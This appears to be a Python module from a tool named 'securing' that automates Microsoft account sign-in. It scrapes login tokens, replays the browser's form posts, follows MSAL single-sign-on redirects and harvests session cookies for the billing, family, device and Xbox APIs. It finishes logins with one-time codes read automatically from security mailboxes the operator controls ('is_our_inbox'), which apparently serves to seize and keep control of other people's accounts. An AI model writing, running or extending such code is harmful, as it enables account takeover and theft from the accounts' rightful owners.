import logging
import re
import time

import httpx

from securing.utils.cookies.safe_cookies import has_cookie

# MSAL bridge / SSO pages can stall forever when timeout=None.
_POLISH_TIMEOUT = httpx.Timeout(25.0, connect=10.0)


def _extract_sso_redirect(html: str) -> str | None:
    """Pull complete-sso-with-redirect URL from polish / MSAL bridge HTML."""
    patterns = (
        r'https://account\.microsoft\.com/auth/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+',
        r'content="\d+;(https://account\.microsoft\.com/auth/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+)"',
        r'location\.replace\("(https://account\.microsoft\.com/auth/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+)"\)',
        r'window\.location\.replace\("(https://account\.microsoft\.com/auth/complete-sso-with-redirect\?state=[A-Za-z0-9_\-+/=]+)"\)',
    )
    for pat in patterns:
        m = re.search(pat, html)
        if m:
            return m.group(1) if m.lastindex else m.group(0)
    return None


def _login_cookies_present(session: httpx.AsyncClient) -> bool:
    """True when MSA login cookies exist (NOT enough for account.microsoft.com APIs)."""
    return (
        has_cookie(session, "MSPAuth")
        or has_cookie(session, "__Host-MSAAUTH")
        or has_cookie(session, "__Host-MSAAUTHP")
        or has_cookie(session, "WLSSC")
    )


def _amc_api_ready(session: httpx.AsyncClient) -> bool:
    """True when account.microsoft.com profile/billing APIs can authorize."""
    return has_cookie(session, "AMCSecAuthJWT") or has_cookie(session, "AMCSecAuth")


def _amc_home_ready(session: httpx.AsyncClient) -> bool:
    """Home APIs (devices/family) need AMCSecAuth — JWT alone still 401s them."""
    return has_cookie(session, "AMCSecAuth")


def _session_ready(session: httpx.AsyncClient) -> bool:
    # Kept for callers; prefer _amc_api_ready when deciding to skip AMC SSO.
    return _amc_api_ready(session) or _login_cookies_present(session)


def _is_msal_bridge(html: str) -> bool:
    return (
        "MSALBrowserBundleName" in html
        or "complete-client-signin-oauth" in html
        or "ssoSilent" in html
    )


# Cookies only issued once the login actually finished. ``__Host-MSAAUTH`` is
# set as soon as the OTP is accepted, so it is NOT a "signed in" signal.
_SESSION_COOKIES = ("WLSSC", "MSPAuth", "AMCSecAuth", "AMCSecAuthJWT")


def login_session_ready(session: httpx.AsyncClient) -> bool:
    """True when login.live.com / account APIs have a real signed-in session.

    A half-finished login leaves ``__Host-MSAAUTH`` behind with no WLSSC: the
    classic ``t`` token comes back as the i5030 sign-in page, AMC silent
    sign-in is denied and Xbox sisu SSO bounces to a login page.
    """
    return any(has_cookie(session, name) for name in _SESSION_COOKIES)


async def _post_kmsi(session: httpx.AsyncClient, url_post: str, ppft: str):
    """Finish/continue the login: the type=28 form the browser submits."""
    return await session.post(
        url=url_post,
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": (
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/avif,image/webp,image/apng,*/*;q=0.8,"
                "application/signed-exchange;v=b3;q=0.7"
            ),
        },
        data=f"PPFT={ppft}&canary=&LoginOptions=3&type=28&hpgrequestid=&ctx=",
        follow_redirects=True,
        timeout=_POLISH_TIMEOUT,
    )


async def _retry_kmsi_with_fresh_tokens(session: httpx.AsyncClient) -> str | None:
    """Re-finish the login with tokens scraped from the *current* page.

    When the type=28 reply is a login page instead of the MSAL SSO bridge the
    tokens we sent were stale (already consumed by the OTP/password post). A
    fresh login page normally carries usable ones, so retry once or twice and
    return the ``complete-sso-with-redirect`` URL if the bridge appears.
    """
    from securing.utils.cookies.get_livedata import livedata

    for attempt in (1, 2):
        try:
            live = await livedata(session)
        except Exception:
            logging.exception("polish retry: livedata failed")
            return None
        url_post = (live or {}).get("urlPost")
        ppft = (live or {}).get("ppft")
        if not (url_post and ppft):
            return None
        try:
            resp = await _post_kmsi(session, url_post, ppft)
        except (httpx.TimeoutException, httpx.TransportError) as exc:
            logging.warning("polish retry %s transport error: %s", attempt, exc)
            continue
        logging.info(
            "Polish retry response (attempt %s): %s",
            attempt,
            (resp.text or "")[:2000],
        )
        sso = _extract_sso_redirect(resp.text or "")
        if sso:
            print(f"[+] - Polish: login finished with fresh tokens (attempt {attempt})")
            return sso
    return None


async def ensure_login_session(
    session: httpx.AsyncClient,
    email: str,
    security_email: str | None = None,
    *,
    otp_timeout: float = 75.0,
) -> bool:
    """Re-run the OTP login to finish a half-established login.live.com session.

    Only possible when the account's OTP proof mailbox is one we can read; if
    it is not, this returns False and callers keep their existing behaviour.
    """
    from mail.settings import is_our_inbox
    from securing.auth.get_msaauth import get_msaauth
    from securing.auth.send_auth import send_auth
    from securing.utils.cookies.get_email_code import get_email_code
    from securing.utils.cookies.get_livedata import livedata

    address = str(security_email or "").strip()
    if not email or not address or not is_our_inbox(address):
        logging.warning(
            "login session recovery skipped — unreadable OTP inbox for %s (security_email=%r)",
            email,
            security_email,
        )
        return False

    for attempt in (1, 2):
        since = time.time()
        try:
            live = await livedata(session)
        except Exception:
            logging.exception("login session recovery: livedata failed")
            return False
        try:
            info = await send_auth(session, email)
        except Exception:
            logging.exception("login session recovery: send_auth failed")
            return False
        flowtoken = info.get("gotc_flowtoken") if isinstance(info, dict) else None
        if not flowtoken:
            logging.warning(
                "login session recovery: no OTP flow token for %s (resp=%r)",
                email,
                (info or {}).get("type") if isinstance(info, dict) else info,
            )
            return False
        inbox = (info.get("otc_inbox") if isinstance(info, dict) else None) or address
        print(
            f"[~] - Login session recovery {attempt}/2: waiting for code in {inbox}...",
            flush=True,
        )
        code = await get_email_code(inbox, timeout=otp_timeout, since=since)
        if not code:
            print(
                "[!] - Login session recovery: no code arrived in the security mailbox",
                flush=True,
            )
            return False
        try:
            msaauth = await get_msaauth(session, email, flowtoken, live, code)
        except Exception:
            logging.exception("login session recovery: get_msaauth failed")
            continue
        if not isinstance(msaauth, dict) or msaauth.get("_error"):
            logging.warning(
                "login session recovery attempt %s rejected: %r", attempt, msaauth
            )
            continue
        try:
            await polish_host(session, msaauth)
        except Exception:
            logging.exception("login session recovery: polish failed")
        print(f"[+] - Login session recovery {attempt}/2: login re-established", flush=True)
        return True
    return False


async def polish_host(session: httpx.AsyncClient, post_data: dict) -> str:
    # Persist Microsoft session (WLSSC / AMCSecAuthJWT) for account.microsoft.com APIs.
    # Never block forever: MSAL JS bridge SSO GETs hang with timeout=None.
    from securing.utils.cookies.ensure_amc_jwt import ensure_amc_jwt

    if post_data.get("_cookies_only"):
        print("[~] - Polish: cookies-only path (MSAAUTH already present)")
        logging.info("polish_host: cookies-only — hitting account portals for AMC/WLSSC")
        for portal in (
            "https://account.live.com/",
            "https://account.microsoft.com/",
        ):
            try:
                resp = await session.get(
                    portal,
                    follow_redirects=True,
                    timeout=_POLISH_TIMEOUT,
                )
                logging.info(
                    "polish_host cookies-only %s -> status=%s url=%s",
                    portal,
                    resp.status_code,
                    resp.url,
                )
            except (httpx.TimeoutException, httpx.TransportError) as exc:
                logging.warning("polish_host cookies-only %s failed: %s", portal, exc)
        await ensure_amc_jwt(session)
        return ""

    polish = await _post_kmsi(session, post_data["urlPost"], post_data["ppft"])

    logging.info("Polish Host Response: %s", polish.text[:2000])
    print(f"[+] - Polish Host Response: {polish.text[:500]}")

    if 'PageID" content="BssoInterrupt"' in polish.text or "BssoInterrupt" in polish.text:
        logging.info("polish_host: BssoInterrupt — skipping SSO form finish")
        print("[~] - Polish hit BssoInterrupt; relying on existing session cookies")
        await ensure_amc_jwt(session)
        return polish.text

    # JWT alone is enough for MSADELEGATE + owner-info fallback, but home APIs
    # (devices/family) need AMCSecAuth from the SSO form finish. Only skip the
    # MSAL SSO GET when AMCSecAuth is already present.
    if _amc_home_ready(session) and _is_msal_bridge(polish.text):
        print("[~] - Polish: MSAL bridge + AMCSecAuth present — skipping SSO GET")
        return polish.text

    if _amc_home_ready(session) and not _extract_sso_redirect(polish.text):
        print("[~] - Polish: AMCSecAuth present, no SSO URL — done")
        return polish.text

    sso_redirect = _extract_sso_redirect(polish.text)
    if not sso_redirect and not _amc_home_ready(session):
        # A login page here means the type=28 post used tokens the login flow
        # had already consumed. Re-finish once with tokens from the live page:
        # without it the session never gets WLSSC, so get_t returns i5030, AMC
        # silent sign-in is denied and Xbox sisu SSO dies on a login page.
        sso_redirect = await _retry_kmsi_with_fresh_tokens(session)

    if not sso_redirect:
        logging.warning("polish_host: no complete-sso-with-redirect URL in response")
        print("[!] - Polish: no SSO redirect URL found — bootstrapping AMC JWT")
        await ensure_amc_jwt(session)
        return polish.text

    # If we already have AMCSecAuth, SSO form is optional — don't risk a hang.
    if _amc_home_ready(session):
        print("[~] - Polish: AMCSecAuth already set — skipping SSO GET")
        return polish.text

    if _amc_api_ready(session) and not _amc_home_ready(session):
        print("[~] - Polish: have AMC JWT but not AMCSecAuth — finishing SSO for home APIs")
    else:
        print("[~] - Polish: following SSO redirect…")
    try:
        auth = await session.get(
            url=sso_redirect,
            follow_redirects=True,
            timeout=_POLISH_TIMEOUT,
        )
    except (httpx.TimeoutException, httpx.TransportError) as exc:
        logging.warning("polish_host: SSO GET failed (%s) — continuing with cookies", exc)
        print(f"[!] - Polish SSO GET failed ({exc.__class__.__name__}); continuing")
        await ensure_amc_jwt(session)
        return polish.text

    action_m = re.search(r'action="([^"]+)"', auth.text)
    pprid_m = re.search(r'name="pprid"[^>]*value="([^"]+)"', auth.text)
    nap_m = re.search(r'name="NAP"[^>]*value="([^"]+)"', auth.text)
    anon_m = re.search(r'name="ANON"[^>]*value="([^"]+)"', auth.text)
    t_m = re.search(r'name="t"[^>]*value="([^"]+)"', auth.text)

    if not (action_m and pprid_m and nap_m and anon_m and t_m):
        logging.warning("polish_host: SSO page missing form fields")
        print("[!] - Polish: SSO page missing form fields — bootstrapping AMC JWT")
        await ensure_amc_jwt(session)
        return auth.text

    try:
        await session.post(
            url=action_m.group(1),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data={
                "pprid": pprid_m.group(1),
                "NAP": nap_m.group(1),
                "ANON": anon_m.group(1),
                "t": t_m.group(1),
            },
            follow_redirects=True,
            timeout=_POLISH_TIMEOUT,
        )
    except (httpx.TimeoutException, httpx.TransportError) as exc:
        logging.warning("polish_host: SSO form post failed (%s)", exc)
        print(f"[!] - Polish SSO form post failed ({exc.__class__.__name__})")

    if not _amc_api_ready(session):
        await ensure_amc_jwt(session)

    return auth.text
